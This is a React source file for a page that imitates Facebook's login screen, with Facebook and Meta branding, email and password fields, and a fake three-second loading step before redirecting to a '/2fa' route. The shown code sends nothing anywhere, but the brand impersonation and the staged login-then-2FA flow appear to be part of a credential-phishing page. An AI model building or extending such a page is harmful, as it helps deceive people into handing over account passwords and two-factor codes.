import React from 'react';
import { useNavigate } from 'react-router-dom';
import { loading } from "../lib/Alert"

export default function FacebookLogin() {
  const navigate = useNavigate()


  function HandleSubmit(){

    loading()

    setTimeout(()=>{
      loading(false)
      navigate("/2fa")
    },3000)

    
  }
  

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-between font-sans antialiased mt-10">
      {/* Top Header/Logo Section */}
      <header className="w-full py-6 flex justify-center border-b border-gray-100">
        <div className="w-12 h-12 bg-[#1877F2] rounded-full flex items-center justify-center shadow-sm">
          {/* Custom SVG Facebook 'f' for pixel-perfection without external icon libraries */}
          <img src="/facebook.png" alt="facebook" />
        </div>
      </header>

      {/* Main Login Card Container */}
      <main className="w-full max-w-[400px] px-6 flex-1 flex flex-col justify-center pb-12">
        
        {/* Back Navigation and Title */}
        <div className="flex items-center gap-4 mb-8">
          <h1 className="text-xl font-bold text-gray-950 tracking-tight">Log in to Facebook</h1>
        </div>

        {/* Login Form */}
        <form onSubmit={(e) => e.preventDefault()} className="space-y-4">
          <div>
            <input
              type="text"
              placeholder="Email address or mobile number"
              className="w-full px-4 py-3.5 border border-gray-300 rounded-xl text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-colors"
              required
            />
          </div>
          
          <div>
            <input
              type="password"
              placeholder="Password"
              className="w-full px-4 py-3.5 border border-gray-300 rounded-xl text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-colors"
              required
            />
          </div>

          <button 
            onClick={HandleSubmit}
            type="submit"
            className="w-full py-3 bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold rounded-full text-base transition-colors duration-200 mt-2 shadow-sm"
          >
            Log in
          </button>
        </form>

        {/* Forgotten Password Link */}
        <div className="text-center mt-5">
          <a 
            href="#forgot" 
            className="text-sm font-medium text-gray-900 hover:underline tracking-tight"
          >
            Forgotten password?
          </a>
        </div>

        {/* Spacer / Divider area matched to layout spacing */}
        <div className="my-10 border-t border-transparent"></div>

        {/* Create New Account Button */}
        <div className="w-full">
          <button
            type="button"
            className="w-full py-2.5 border border-[#1877F2] text-[#1877F2] hover:bg-blue-50 font-semibold rounded-full text-[15px] transition-colors duration-200"
          >
            Create new account
          </button>
        </div>
      </main>

      {/* Footer Branding Section */}
      <footer className="w-full py-6 flex justify-center items-center gap-1 text-gray-500 text-xs font-semibold border-t border-gray-50">
        {/* Meta Logo Inline SVG */}
        <svg 
          viewBox="0 0 24 24" 
          className="w-4 h-4 fill-[#1877F2]"
        >
          <path d="M18.917 12.82c-.394 0-.776-.145-1.077-.407-.636-.554-1.46-.86-2.317-.86-.874 0-1.705.313-2.342.88l-.134.12a.377.377 0 01-.504 0l-.135-.12a3.528 3.528 0 00-2.342-.88c-.856 0-1.68.306-2.317.86a1.64 1.64 0 01-1.077.407c-.42 0-.825-.16-1.125-.453-.59-.572-.916-1.343-.916-2.17 0-.828.326-1.599.916-2.17.3-.294.705-.454 1.125-.454.394 0 .776.145 1.077.407.636.554 1.46.86 2.317.86.874 0 1.705-.313 2.342-.88l.134-.12a.377.377 0 01.504 0l.135.12c.637.567 1.468.88 2.342.88.857 0 1.68-.306 2.317-.86.301-.262.683-.407 1.077-.407.42 0 .825.16 1.125.453.59.572.916 1.343.916 2.17 0 .828-.326 1.599-.916 2.17-.3.294-.705.454-1.125.454zM12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2z" opacity=".1"/>
          <path d="M15.523 9.043c-1.196 0-2.29.471-3.13 1.25a4.67 4.67 0 00-3.13-1.25c-1.328 0-2.553.567-3.415 1.58-.813.955-1.242 2.214-1.21 3.545.064 2.656 2.158 4.793 4.773 4.793 1.197 0 2.29-.472 3.132-1.252a4.678 4.678 0 003.13 1.252c1.327 0 2.553-.567 3.414-1.58.813-.955 1.243-2.214 1.21-3.545-.063-2.656-2.157-4.793-4.774-4.793zm3.176 4.904c-.021.841-.29 1.631-.794 2.222-.533.627-1.278.974-2.096.974-.82 0-1.59-.387-2.115-.926l-.68-.7a.12.12 0 00-.168 0l-.68.7c-.524.539-1.296.926-2.114.926-.819 0-1.564-.347-2.097-.974-.53-.623-.79-1.461-.75-2.355.042-1.74 1.455-3.15 3.167-3.15.82 0 1.59.387 2.115.926l.68.7a.12.12 0 00.168 0l.68-.7c.524-.539 1.296-.926 2.114-.926 1.764 0 3.165 1.464 3.166 3.23-.002.049-.004.103-.006.153z"/>
        </svg>
        <span className="text-[#1C1E21] tracking-tight">Meta</span>
      </footer>
    </div>
  );
}